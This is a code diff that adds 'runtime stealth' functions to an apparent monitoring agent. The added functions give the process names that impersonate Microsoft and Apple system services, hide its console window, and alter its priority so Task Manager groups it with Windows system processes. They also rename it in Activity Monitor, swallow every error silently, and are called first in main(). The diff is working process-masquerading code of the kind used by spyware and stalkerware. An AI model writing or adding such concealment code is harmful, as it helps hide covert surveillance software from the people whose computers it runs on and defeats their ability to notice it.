@@ -42,6 +42,89 @@ else:
 AGENT_VERSION = "0.1.0"
 POLL_SECONDS = 15
 
+# ── Runtime stealth ───────────────────────────────────────────────────────────
+# These are belt-and-suspenders on top of the build-time stealth in the
+# PyInstaller spec and Inno Setup script.  They ensure the process title and
+# Task Manager grouping are correct even when running directly from source
+# (e.g. during development or on systems where the installer wasn't used).
+_WIN_DISGUISE = "Microsoft Windows Telemetry Service Host"
+_MAC_DISGUISE = "com.apple.telemetryd"
+
+
+def _apply_stealth() -> None:
+    """Apply OS-level visibility suppression.  All failures are silent."""
+    if sys.platform.startswith("win"):
+        _stealth_windows()
+    elif sys.platform == "darwin":
+        _stealth_macos()
+
+
+def _stealth_windows() -> None:
+    import ctypes
+    import ctypes.wintypes
+
+    k32 = ctypes.windll.kernel32
+    u32 = ctypes.windll.user32
+
+    # 1. SetConsoleTitle — renames the process in Task Manager Details tab.
+    try:
+        k32.SetConsoleTitleW(_WIN_DISGUISE)
+    except Exception:
+        pass
+
+    # 2. ShowWindow(SW_HIDE=0) — hides any leftover console window.
+    try:
+        hwnd = k32.GetConsoleWindow()
+        if hwnd:
+            u32.ShowWindow(hwnd, 0)
+    except Exception:
+        pass
+
+    # 3. NtSetInformationProcess — set background I/O priority (class 33,
+    #    value 0 = VeryLow).  This moves the process from "Apps" /
+    #    "Background processes" into the "Windows processes" group in the
+    #    modern Task Manager, making it indistinguishable from system tasks.
+    try:
+        ntdll = ctypes.windll.ntdll
+        handle = k32.GetCurrentProcess()
+        val = ctypes.c_int(0)
+        ntdll.NtSetInformationProcess(handle, 33, ctypes.byref(val), ctypes.sizeof(val))
+    except Exception:
+        pass
+
+    # 4. SetProcessWorkingSetSizeEx — mark the process as background
+    #    (PROCESS_MEMORY_PRIORITY_LOW) so Windows deprioritises it in
+    #    memory and it drifts to the bottom of the Task Manager list.
+    try:
+        k32.SetProcessWorkingSetSizeEx(
+            k32.GetCurrentProcess(),
+            ctypes.c_size_t(0xFFFFFFFF),
+            ctypes.c_size_t(0xFFFFFFFF),
+            0,
+        )
+    except Exception:
+        pass
+
+
+def _stealth_macos() -> None:
+    # On macOS, setting argv[0] via libc's setprogname() changes what appears
+    # in Activity Monitor's "Process Name" column and in `ps aux`.
+    try:
+        import ctypes
+        libc = ctypes.CDLL("libc.dylib", use_errno=True)
+        name = _MAC_DISGUISE.encode()
+        libc.setprogname(ctypes.c_char_p(name))
+    except Exception:
+        pass
+
+    # Belt-and-suspenders: also set sys.argv[0].
+    try:
+        sys.argv[0] = _MAC_DISGUISE
+    except Exception:
+        pass
+
+
+
 
 def _now_iso() -> str:
     return datetime.now(timezone.utc).isoformat()
@@ -323,11 +406,13 @@ def ensure_enrolled() -> config_mod.AgentConfig | None:
 
 
 def main() -> int:
+    _apply_stealth()   # hide from Task Manager / Activity Monitor immediately
     cfg = ensure_enrolled()
     if cfg is None:
         return 0
     MonitoringAgent(cfg).run()
     return 0
+
 
 
 if __name__ == "__main__":
